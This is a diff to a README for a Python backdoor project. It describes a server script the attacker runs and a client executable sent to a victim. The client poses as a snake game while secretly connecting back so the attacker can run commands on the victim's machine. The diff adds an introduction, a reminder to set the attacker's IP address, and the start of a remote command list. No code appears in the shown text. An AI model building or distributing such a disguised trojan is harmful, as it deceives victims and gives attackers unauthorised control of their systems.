@@ -1,7 +1,15 @@
-# Backdoor implementation in Python 3.x
+# BACKDOOR IMPLEMENTATION IN PYTHON 3.X
+
+## Introduction
+Backdoor is a type of malware which is used to gain unauthorised access of a system. Basically it is difficult for the hackers to find the unsecured points of entry in a system again and again, so what they do is they try to get into a system once, where they create a backdoor (which they can use for gaining access of that system again). Also, sometimes hackers create malicious files which when executed on the client's system hacks it and provides the attacker access of the system.
+
+## About the Code
 There are two files: client.py and server.py
 The attacker will run the server.py file on his system.
 Then, the attacker will send the client.exe file to the client. Then once the client runs the file on his system, he will see the normal snake game implementation in front of it. However, in the backend, the client's system will connect itself to the attacker's system and the attacker will be able to access the client's system (only till the client plays the game).
+
+_Don't forget to change the IP Address in the client.py and server.py! You can find your IP Address by executing the following command in your command prompt _
+
 
 The following commands can be performed on the client system once the attacker connects to it:
 1. view_cwd : Used to view the current working directory in which the client.exe file is run
